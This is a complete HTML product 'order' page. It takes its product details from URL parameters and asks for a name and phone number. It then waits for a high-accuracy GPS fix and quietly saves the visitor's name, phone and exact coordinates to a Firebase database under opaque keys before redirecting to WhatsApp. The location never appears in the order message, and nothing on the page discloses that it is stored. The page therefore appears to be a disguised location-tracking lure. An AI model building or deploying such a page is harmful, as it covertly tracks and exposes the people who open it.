<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Product Page</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">

<style>
  :root {
    --emerald: #00b894;
    --jade:    #00cec9;
    --gold:    #f9c74f;
    --ink:     #0d1f1a;
    --fog:     rgba(255,255,255,0.08);
    --glass:   rgba(255,255,255,0.13);
    --border:  rgba(255,255,255,0.18);
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'DM Sans', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    background: var(--ink);
    overflow-x: hidden;
    position: relative;
  }

  /* ── Animated blobs ── */
  body::before, body::after {
    content: '';
    position: fixed;
    border-radius: 50%;
    filter: blur(80px);
    opacity: 0.45;
    animation: drift 14s ease-in-out infinite alternate;
    pointer-events: none;
    z-index: 0;
  }
  body::before {
    width: 520px; height: 520px;
    background: radial-gradient(circle, #00b894, #004d3d);
    top: -120px; left: -120px;
  }
  body::after {
    width: 440px; height: 440px;
    background: radial-gradient(circle, #00cec9, #006b6b);
    bottom: -100px; right: -100px;
    animation-delay: -7s;
  }

  @keyframes drift {
    from { transform: translate(0,0) scale(1); }
    to   { transform: translate(40px, 30px) scale(1.08); }
  }

  /* ── Card ── */
  .card {
    position: relative;
    z-index: 1;
    width: 100%;
    max-width: 460px;
    background: var(--glass);
    backdrop-filter: blur(28px);
    -webkit-backdrop-filter: blur(28px);
    border: 1px solid var(--border);
    border-radius: 28px;
    overflow: hidden;
    box-shadow:
      0 40px 80px rgba(0,0,0,0.55),
      inset 0 1px 0 rgba(255,255,255,0.2);
    animation: rise 0.7s cubic-bezier(0.22,1,0.36,1) both;
  }

  @keyframes rise {
    from { opacity:0; transform: translateY(32px) scale(0.97); }
    to   { opacity:1; transform: translateY(0) scale(1); }
  }

  @media (min-width: 900px) {
    .card {
      max-width: 860px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      grid-template-rows: auto;
    }
    .img-wrap   { grid-column: 1; grid-row: 1 / 4; }
    .meta       { grid-column: 2; }
    .qty-wrap   { grid-column: 2; }
    .form-panel { grid-column: 2; }
  }

  /* ── Image ── */
  .img-wrap {
    position: relative;
    overflow: hidden;
    height: 280px;
  }

  @media (min-width: 900px) { .img-wrap { height: auto; min-height: 420px; } }

  .img-wrap img {
    width: 100%; height: 100%;
    object-fit: cover;
    display: block;
    transition: transform 0.6s cubic-bezier(0.22,1,0.36,1);
  }
  .img-wrap:hover img { transform: scale(1.06); }

  /* shimmer overlay while no image */
  .img-wrap::after {
    content: '';
    position: absolute; inset: 0;
    background: linear-gradient(160deg, rgba(255,255,255,0.06) 0%, transparent 60%);
    pointer-events: none;
  }

  /* ── Meta ── */
  .meta {
    padding: 28px 28px 0;
  }

  .label {
    font-size: 10px;
    font-weight: 500;
    letter-spacing: 0.18em;
    text-transform: uppercase;
    color: var(--emerald);
    margin-bottom: 8px;
  }

  .product-name {
    font-family: 'Playfair Display', Georgia, serif;
    font-size: clamp(22px, 4vw, 30px);
    font-weight: 900;
    color: #fff;
    line-height: 1.15;
    margin-bottom: 16px;
  }

  .price-row {
    display: flex;
    align-items: baseline;
    gap: 8px;
  }

  .price-currency {
    font-size: 18px;
    font-weight: 300;
    color: rgba(255,255,255,0.6);
  }

  .price-amount {
    font-family: 'Playfair Display', Georgia, serif;
    font-size: clamp(32px, 6vw, 46px);
    font-weight: 700;
    color: var(--gold);
    letter-spacing: -1px;
    transition: all 0.25s ease;
  }

  /* ── Quantity ── */
  .qty-wrap {
    padding: 20px 28px;
    display: flex;
    align-items: center;
    gap: 0;
  }

  .qty-label {
    font-size: 12px;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: rgba(255,255,255,0.45);
    margin-right: auto;
  }

  .qty-control {
    display: flex;
    align-items: center;
    gap: 0;
    background: var(--fog);
    border: 1px solid var(--border);
    border-radius: 50px;
    padding: 4px;
  }

  .qty-btn {
    width: 36px; height: 36px;
    border-radius: 50%;
    border: none;
    background: transparent;
    color: rgba(255,255,255,0.7);
    font-size: 22px;
    line-height: 1;
    cursor: pointer;
    display: flex; align-items: center; justify-content: center;
    transition: background 0.2s, color 0.2s, transform 0.15s;
    user-select: none;
  }
  .qty-btn:hover {
    background: var(--emerald);
    color: #fff;
    transform: scale(1.1);
  }
  .qty-btn:active { transform: scale(0.94); }

  .qty-num {
    min-width: 40px;
    text-align: center;
    font-family: 'Playfair Display', Georgia, serif;
    font-size: 20px;
    font-weight: 700;
    color: #fff;
  }

  /* ── Divider ── */
  .divider {
    height: 1px;
    background: var(--border);
    margin: 0 28px;
  }

  /* ── Form ── */
  .form-panel {
    padding: 24px 28px 28px;
  }

  .input-group {
    position: relative;
    margin-bottom: 14px;
  }

  .input-group input {
    width: 100%;
    padding: 14px 16px 14px 44px;
    background: var(--fog);
    border: 1px solid var(--border);
    border-radius: 14px;
    color: #fff;
    font-family: 'DM Sans', sans-serif;
    font-size: 14px;
    outline: none;
    transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
  }

  .input-group input::placeholder { color: rgba(255,255,255,0.38); }

  .input-group input:focus {
    border-color: var(--emerald);
    background: rgba(0,184,148,0.06);
    box-shadow: 0 0 0 3px rgba(0,184,148,0.15);
  }

  .input-icon {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    width: 18px; height: 18px;
    opacity: 0.45;
    pointer-events: none;
  }

  /* ── Error / Success ── */
  #messages {
    font-size: 12.5px;
    font-weight: 500;
    color: #ff7675;
    min-height: 18px;
    margin-bottom: 6px;
    text-align: center;
    letter-spacing: 0.02em;
  }

  #success {
    font-size: 13px;
    color: var(--emerald);
    text-align: center;
    margin-top: 10px;
    min-height: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }

  /* ── Order Button ── */
  .order-btn {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 16px;
    background: linear-gradient(135deg, var(--emerald), var(--jade));
    color: #fff;
    font-family: 'DM Sans', sans-serif;
    font-size: 15px;
    font-weight: 500;
    letter-spacing: 0.04em;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
    box-shadow: 0 6px 24px rgba(0,184,148,0.35);
  }

  .order-btn::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
    opacity: 0;
    transition: opacity 0.2s;
  }

  .order-btn:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 12px 32px rgba(0,184,148,0.5);
  }
  .order-btn:hover::before { opacity: 1; }
  .order-btn:active:not(:disabled) { transform: translateY(0); }

  .order-btn:disabled {
    opacity: 0.55;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }

  /* spinner inside button */
  .spinner {
    display: inline-block;
    width: 14px; height: 14px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    vertical-align: middle;
    margin-right: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* ── Mobile tweaks ── */
  @media (max-width: 480px) {
    body { padding: 16px; }
    .meta, .form-panel { padding-left: 20px; padding-right: 20px; }
    .qty-wrap { padding: 18px 20px; }
    .divider { margin: 0 20px; }
  }
</style>
</head>
<body>

<div class="card">
  <!-- LEFT: Image -->
  <div class="img-wrap">
    <img id="img" src="" alt="Product">
  </div>

  <!-- TOP RIGHT: Meta -->
  <div class="meta">
    <p class="label">Fresh Pick · Limited Stock</p>
    <h2 class="product-name" id="productName">Loading…</h2>
    <div class="price-row">
      <span class="price-currency">₹</span>
      <span class="price-amount" id="price">0</span>
    </div>
  </div>

  <!-- MID RIGHT: Quantity -->
  <div class="qty-wrap">
    <span class="qty-label">Quantity</span>
    <div class="qty-control">
      <button class="qty-btn" id="decrease" aria-label="Decrease">−</button>
      <div class="qty-num" id="qty">1</div>
      <button class="qty-btn" id="increase" aria-label="Increase">+</button>
    </div>
  </div>

  <div class="divider"></div>

  <!-- BOTTOM RIGHT: Form -->
  <div class="form-panel">
    <div class="input-group">
      <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
      </svg>
      <input type="text" placeholder="Your full name" id="customerName" autocomplete="name"/>
    </div>

    <div class="input-group">
      <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.07 12 19.79 19.79 0 0 1 .93 3.18a2 2 0 0 1 2-2.18h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
      </svg>
      <input type="number" placeholder="Phone number" id="phone" autocomplete="tel"/>
    </div>

    <div id="messages"></div>

    <button class="order-btn" id="orderNow">
      Place Order →
    </button>

    <div id="success"></div>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyAVWLIDjsmMcH2kfqiKwQ1-jFU6d6654pY",
    authDomain: "myproject-fdb4c.firebaseapp.com",
    databaseURL: "https://myproject-fdb4c-default-rtdb.firebaseio.com",
    projectId: "myproject-fdb4c",
    storageBucket: "myproject-fdb4c.firebasestorage.app",
    messagingSenderId: "600134367178",
    appId: "1:600134367178:web:ea8b0daa3928c7791c8133",
    measurementId: "G-CQFS0NF7CL"
  };

  const app = initializeApp(firebaseConfig);
  const database = getDatabase(app);

  const params = new URLSearchParams(window.location.search);
  let quantity = 1;
  const name  = params.get("name")  || "Product";
  const price = Number(params.get("price")) || 0;
  const img   = params.get("img")   || "";

  document.getElementById("img").src = img;
  document.getElementById("productName").innerText = name;

  function updatePrice() {
    document.getElementById("price").innerText = (price * quantity).toLocaleString('en-IN');
    document.getElementById("qty").innerText = quantity;
  }

  document.getElementById("increase").addEventListener("click", () => { quantity++; updatePrice(); });
  document.getElementById("decrease").addEventListener("click", () => { if (quantity > 1) { quantity--; updatePrice(); } });

  document.getElementById("orderNow").addEventListener("click", function () {
    const customer = document.getElementById("customerName").value.trim();
    const phone    = document.getElementById("phone").value.trim();
    const msgEl    = document.getElementById("messages");
    const sucEl    = document.getElementById("success");
    const btn      = this;

    msgEl.textContent = "";

    if (!customer || !phone) {
      msgEl.textContent = "⚠ Please fill in your name and phone number.";
      return;
    }
    if (!/^\d{7,15}$/.test(phone)) {
      msgEl.textContent = "⚠ Enter a valid phone number.";
      return;
    }

    btn.disabled = true;
    btn.innerHTML = `<span class="spinner"></span> Getting location…`;
    sucEl.innerHTML = "";

    let bestAccuracy = Infinity;
    let bestPosition = null;
    let orderPlaced  = false;

    const watchId = navigator.geolocation.watchPosition(
      function (position) {
        const acc = position.coords.accuracy;
        if (acc < bestAccuracy) { bestAccuracy = acc; bestPosition = position; }

        if (acc < 30 && !orderPlaced) {
          orderPlaced = true;
          navigator.geolocation.clearWatch(watchId);
          btn.innerHTML = `<span class="spinner"></span> Saving order…`;

          const lat = bestPosition.coords.latitude;
          const lng = bestPosition.coords.longitude;

          const refdata = push(ref(database, "submit"));
          set(refdata, { a: customer, b: phone, c1: lat, c2: lng })
            .then(() => {
              btn.innerHTML = "✓ Redirecting to WhatsApp…";
              const message =
                `🛒 New Order\n` +
                `Name: ${customer}\n` +
                `Phone: ${phone}\n` +
                `Product: ${name}\n` +
                `Qty: ${quantity}\n` +
                `Total: ₹${price * quantity}`;
              window.location.href =
                "https://wa.me/919576718589?text=" + encodeURIComponent(message);
            })
            .catch(() => {
              alert("Failed to save order. Please try again.");
              btn.disabled = false;
              btn.innerHTML = "Place Order →";
              orderPlaced = false;
            });
        }
      },
      function (error) {
        btn.disabled = false;
        btn.innerHTML = "Place Order →";
        msgEl.textContent = "⚠ Location error: " + error.message;
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  });

  updatePrice();
</script>
</body>
</html>
